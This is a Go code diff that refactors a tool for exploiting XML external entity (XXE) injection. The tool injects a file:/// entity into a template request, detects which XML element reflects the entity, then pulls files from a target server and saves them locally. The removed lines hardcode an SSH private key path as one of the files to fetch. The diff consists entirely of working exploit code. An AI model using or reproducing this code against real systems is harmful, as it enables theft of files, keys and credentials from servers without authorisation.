@@ -4,50 +4,36 @@ import (
 	"bytes"
 	"encoding/xml"
 	"fmt"
-	"io/ioutil"
 	"regexp"
 
 	str "strings"
 )
 
-func DirectTest(url, xmlTemplate, cookie, outDir, fileList string) error {
+func (p *ParamsT) DirectTest() error {
 	fmt.Println("testing...")
 
-	xmlData, err := ioutil.ReadFile(xmlTemplate)
-	if err != nil {
-		return err
-	}
-
-	leafName, err := DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList)
+	leafName, err := p.DirectDetectLeaf()
 	if err != nil {
 		return err
 	}
 
 	if leafName == "" {
-		return fmt.Errorf("can't find XXE injection")
+		return fmt.Errorf("can't find direct XXE injection")
 	}
 
-	files, err := readFileList(fileList)
-	if err != nil {
-		return err
-	}
-
-	files = append(files, "c:/users/daniel/.ssh/id_rsa")
-
-	for _, file := range files {
+	for _, file := range p.Files {
 		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
 		entity := fmt.Sprintf(fmtS, file)
 
-		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)
+		reqXml := str.Replace(p.XmlData, "?>", "?>"+entity, 1)
 
-		content, err := getFileContent(url, file, reqXml,
-			cookie, outDir, leafName)
+		content, err := p.getFileContent(file, reqXml, leafName)
 		if err != nil {
 			return err
 		}
 
 		if content != "" {
-			locFile := makeLocalPath(outDir, file)
+			locFile := makeLocalPath(p.OutDir, file)
 			err = saveFile(locFile, content, false)
 			if err != nil {
 				return err
@@ -58,16 +44,9 @@ func DirectTest(url, xmlTemplate, cookie, outDir, fileList string) error {
 	return nil
 }
 
-func DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList string) (string, error) {
-	xmlData, err := ioutil.ReadFile(xmlTemplate)
-	if err != nil {
-		return "", err
-	}
-
-	dec := xml.NewDecoder(bytes.NewBuffer(xmlData))
-
+func (p *ParamsT) DirectDetectLeaf() (string, error) {
 	var n NodeT
-	err = dec.Decode(&n)
+	err := p.XmlDecoder.Decode(&n)
 	if err != nil {
 		return "", err
 	}
@@ -86,22 +65,15 @@ func DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList string) (string
 		return true
 	})
 
-	files, err := readFileList(fileList)
-	if err != nil {
-		return "", err
-	}
-
-	files = append(files, "c:/users/daniel/.ssh/id_rsa")
-
-	for _, file := range files {
+	for _, file := range p.Files {
 		fmtS := `<!DOCTYPE root [<!ENTITY ext SYSTEM "file:///%s"> ]>`
 		entity := fmt.Sprintf(fmtS, file)
 
-		reqXml := str.Replace(string(xmlData), "?>", "?>"+entity, 1)
+		reqXml := str.Replace(p.XmlData, "?>", "?>"+entity, 1)
 
 		for _, leaf := range leafs {
-			content, err := getFileContent(url, file, reqXml,
-				cookie, outDir, leaf.Name)
+			content, err := p.getFileContent(file, reqXml,
+				leaf.Name)
 			if err != nil {
 				return "", err
 			}
@@ -115,7 +87,7 @@ func DirectDetectLeaf(url, xmlTemplate, cookie, outDir, fileList string) (string
 	return "", nil
 }
 
-func getFileContent(url, file, reqXml, cookie, outDir, leafName string) (string, error) {
+func (p *ParamsT) getFileContent(file, reqXml, leafName string) (string, error) {
 	exp := fmt.Sprintf("(<%s>).*(</%s>)", leafName, leafName)
 	re := regexp.MustCompile(exp)
 
@@ -123,7 +95,7 @@ func getFileContent(url, file, reqXml, cookie, outDir, leafName string) (string,
 	replStr := fmt.Sprintf("${1}\n%s&ext;%s\n${2}", sep, sep)
 	reqXmlMod := re.ReplaceAllString(reqXml, replStr)
 
-	body, err := makeRequest(url, reqXmlMod, cookie, outDir)
+	body, err := makeRequest(p.Url, reqXmlMod, p.Cookie, p.OutDir)
 	if err != nil {
 		return "", err
 	}
